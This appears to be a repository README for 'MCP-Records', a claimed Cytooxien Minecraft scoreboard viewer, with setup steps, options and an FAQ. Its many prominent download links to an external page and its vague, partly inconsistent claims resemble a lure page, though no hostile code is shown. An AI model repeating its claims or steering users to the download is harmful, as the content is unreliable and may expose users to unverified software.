# MCP-Records v1.0 - Cytooxien Scoreboard Viewer 2026

> **An interactive records table for Cytooxien Minecraft party minigames.** Explore player stats, sort columns, compare results, and adjust the layout while live avatars are fetched automatically.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterhallhr1201/mcp-records-table-sorter?style=flat-square)](https://github.com/carterhallhr1201/mcp-records-table-sorter)

---

<p align="center">
  <a href="https://carterhallhr1201.github.io/mcp-records-table-sorter/">
    <img src="https://img.shields.io/badge/Download-MCP%20Records%20Script-brightgreen?style=for-the-badge" alt="Download MCP-Records Script">
  </a>
</p>

> **[Download Latest Build](https://carterhallhr1201.github.io/mcp-records-table-sorter/)**

---

[Download Latest Build](https://carterhallhr1201.github.io/mcp-records-table-sorter/)

---

## What It Does

MCP-Records takes raw Cytooxien party minigame data and turns it into a readable, interactive table. It reads statistics from the Tabulator system and displays them in a flexible layout so you can sort, filter, and inspect player performance across several minigames. If you want to monitor your own progress or study the leaderboard, this script gives you a straightforward view of the competitive scene.

This release also improves the Python-based analysis path, which makes larger datasets easier to process and helps surface useful insights more cleanly. Avatar fetching adds more identity to each player row, and the responsive table keeps navigation comfortable on desktop and mobile browsers alike. The update is aimed at better stability and smoother long-term operation.

---

## Features

- **Interactive Records Table** - View Cytooxien party minigame stats with clickable headers for fast sorting
- **Custom Layout and Sorting** - Move columns around and combine sort rules to highlight the data you care about
- **Avatar Fetching** - Pulls player avatars automatically for a more personal scoreboard view
- **Data Analysis with Python** - Backend scripts manage extraction, cleanup, and aggregation for reliable record handling
- **Real-Time Updates** - Retrieves current results from the Tabulator API so the display stays up to date
- **Responsive Design** - Keeps the interface usable on desktop, tablet, and mobile browsers
- **Export Options** - Export filtered tables to CSV for offline review or sharing
- **Minimal Dependencies** - Operates in the browser, with a lightweight Python backend for data processing

---

## Setup

1. Download the latest release from the link above.
2. Extract the contents to a folder of your choice.
3. Open `index.html` in any modern web browser (Chrome, Firefox, Edge, or Safari recommended).
4. The script will automatically connect to the Cytooxien Tabulator API and load the scoreboard.

For local data analysis, run the Python backend script:

```bash
pip install -r requirements.txt
python analyze.py
```

---

## Options

| Setting | Default | Description |
|---------|---------|-------------|
| `sort_column` | `score` | Default column for sorting records |
| `sort_order` | `desc` | Sort direction (`asc` or `desc`) |
| `avatar_enabled` | `true` | Toggle player avatar loading |
| `page_size` | `25` | Number of records displayed per page |
| `theme` | `light` | Interface theme (`light` or `dark`) |

Example configuration in `config.json`:

```json
{
  "sort_column": "score",
  "sort_order": "desc",
  "avatar_enabled": true,
  "page_size": 25,
  "theme": "light"
}
```

---

## Compatibility

- **Supported Platforms:** Any modern web browser (Chrome 90+, Firefox 88+, Edge 90+, Safari 14+)
- **Game Version:** Cytooxien Minecraft server (all party minigames supported by the Tabulator API)
- **Backend:** Python 3.8+ for data analysis features
- **Known Limitations:** Does not work offline without cached data; requires an active internet connection for avatar fetching and API access

---

## FAQ

**How do I set up MCP-Records?**  
Download the latest build, extract the files, and open `index.html` in your browser. No installation required.

**How do I update to a new version?**  
Replace your existing files with the latest release. Your configuration in `config.json` will be preserved if you keep it separate.

**Can I customize the table layout?**  
Yes. Drag and drop column headers to change their order, and click any header to sort by that metric.

**Does this work on mobile devices?**  
Yes. The table is fully responsive and adapts to smaller screens with touch-friendly controls.

**Where is my data stored?**  
All data is loaded from the Cytooxien Tabulator API and cached locally in your browser. No data is sent to external servers.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
